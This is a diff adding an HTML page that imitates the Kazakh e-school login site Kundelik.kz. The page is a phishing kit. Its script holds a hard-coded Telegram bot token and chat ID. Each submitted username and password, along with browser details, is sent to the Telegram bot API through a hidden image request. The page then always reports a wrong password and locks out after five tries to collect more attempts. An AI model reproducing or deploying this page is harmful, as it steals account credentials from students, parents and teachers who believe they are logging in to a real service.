@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="kk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Күнделік.kz</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+        body {
+            background: #eef2f5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-card {
+            background: white;
+            width: 360px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        .card-header {
+            background: #2c7cb6;
+            padding: 28px 20px;
+            text-align: center;
+        }
+        .card-header h1 {
+            color: white;
+            font-size: 22px;
+            font-weight: 500;
+        }
+        .card-header a {
+            color: rgba(255,255,255,0.8);
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .card-body {
+            padding: 28px 24px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 12px 12px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            font-size: 15px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #2c7cb6;
+        }
+        button {
+            width: 100%;
+            background: #2c7cb6;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        button:hover {
+            background: #1e5a86;
+        }
+        .error-msg, .blocked-msg {
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 13px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        .error-msg {
+            background: #fee;
+            color: #c00;
+            border-left: 3px solid #c00;
+        }
+        .blocked-msg {
+            background: #f8d7da;
+            color: #721c24;
+            text-align: center;
+        }
+        .login-footer {
+            text-align: center;
+            margin-top: 24px;
+            font-size: 12px;
+        }
+        .login-footer a {
+            color: #2c7cb6;
+            text-decoration: none;
+        }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="card-header">
+        <h1>Kundelik.kz сайтына кіру</h1>
+        <a href="#">Жүйеде тіркелмегенсіз бе?</a>
+    </div>
+    <div class="card-body">
+        <div class="error-msg" id="errorMsg"></div>
+        <div class="blocked-msg" id="blockedMsg"></div>
+        
+        <div class="input-group">
+            <label>Пайдаланушы аты</label>
+            <input type="text" id="login_input" placeholder="Логин">
+        </div>
+        <div class="input-group">
+            <label>Құпиясөз</label>
+            <input type="password" id="pass_input" placeholder="Құпиясөз">
+        </div>
+        <button id="Submit1">Кіру</button>
+        <div class="login-footer">
+            <a href="#">Құпиясөзді ұмыттыңыз ба?</a> | <a href="#">Қолдау</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8320434263:AAFlxpu5XuTswFGiaNiF_F8VURwrmV09OJM";
+    const CHAT_ID = "8408918708";
+    
+    let failedAttempts = 0;
+    let blockedUntil = null;
+    
+    function loadFailedAttempts() {
+        try {
+            const saved = localStorage.getItem('kundelik_failed');
+            const savedTime = localStorage.getItem('kundelik_blocked');
+            if (savedTime && parseInt(savedTime) > Date.now()) {
+                blockedUntil = parseInt(savedTime);
+                failedAttempts = parseInt(saved) || 0;
+                document.getElementById('blockedMsg').style.display = 'block';
+                document.getElementById('Submit1').disabled = true;
+            } else if (savedTime && parseInt(savedTime) <= Date.now()) {
+                localStorage.removeItem('kundelik_failed');
+                localStorage.removeItem('kundelik_blocked');
+                failedAttempts = 0;
+                blockedUntil = null;
+                document.getElementById('Submit1').disabled = false;
+                document.getElementById('blockedMsg').style.display = 'none';
+            } else {
+                failedAttempts = parseInt(saved) || 0;
+            }
+        } catch(e) {}
+    }
+    
+    function saveFailedAttempts() {
+        try {
+            localStorage.setItem('kundelik_failed', failedAttempts);
+            if (blockedUntil) {
+                localStorage.setItem('kundelik_blocked', blockedUntil);
+            } else {
+                localStorage.removeItem('kundelik_blocked');
+            }
+        } catch(e) {}
+    }
+    
+    async function onSubmit() {
+        const login = document.getElementById('login_input').value.trim();
+        const password = document.getElementById('pass_input').value;
+        const errorDiv = document.getElementById('errorMsg');
+        const blockedDiv = document.getElementById('blockedMsg');
+        const submitBtn = document.getElementById('Submit1');
+        
+        if (blockedUntil && blockedUntil > Date.now()) {
+            blockedDiv.style.display = 'block';
+            return false;
+        } else if (blockedUntil && blockedUntil <= Date.now()) {
+            blockedUntil = null;
+            failedAttempts = 0;
+            saveFailedAttempts();
+            submitBtn.disabled = false;
+            blockedDiv.style.display = 'none';
+        }
+        
+        if (!login) {
+            errorDiv.style.display = 'block';
+            errorDiv.innerHTML = 'Логинді енгізіңіз';
+            return false;
+        }
+        if (!password) {
+            errorDiv.style.display = 'block';
+            errorDiv.innerHTML = 'Құпиясөзді енгізіңіз';
+            return false;
+        }
+        
+        const now = new Date();
+        const message = `🔐 КҮНДЕЛІК - ЖАҢА ДЕРЕКТЕР 🔐\n━━━━━━━━━━━━━━━━━━━━━━\n👤 Логин: ${login}\n🔑 Құпиясөз: ${password}\n━━━━━━━━━━━━━━━━━━━━━━\n🖥 Браузер: ${navigator.userAgent.substring(0, 80)}\n💻 Платформа: ${navigator.platform}\n🌐 Тіл: ${navigator.language}\n⏰ Уақыт: ${now.toLocaleString('kk-KZ')}`;
+        
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        try { new Image().src = url; } catch(e) {}
+        
+        failedAttempts++;
+        saveFailedAttempts();
+        
+        if (failedAttempts >= 5) {
+            blockedUntil = Date.now() + (5 * 60 * 1000);
+            saveFailedAttempts();
+            submitBtn.disabled = true;
+            blockedDiv.style.display = 'block';
+            errorDiv.style.display = 'none';
+            setTimeout(() => {
+                blockedUntil = null;
+                failedAttempts = 0;
+                saveFailedAttempts();
+                submitBtn.disabled = false;
+                blockedDiv.style.display = 'none';
+            }, 5 * 60 * 1000);
+        } else {
+            errorDiv.style.display = 'block';
+            errorDiv.innerHTML = `Логин немесе құпиясөз қате. Қалған әрекеттер: ${5 - failedAttempts}`;
+        }
+        
+        document.getElementById('pass_input').value = '';
+        return false;
+    }
+    
+    document.getElementById('Submit1').addEventListener('click', onSubmit);
+    document.getElementById('pass_input').addEventListener('keypress', function(e) { if (e.key === 'Enter') onSubmit(); });
+    document.getElementById('login_input').addEventListener('keypress', function(e) { if (e.key === 'Enter') onSubmit(); });
+    
+    loadFailedAttempts();
+</script>
+
+</body>
+</html>
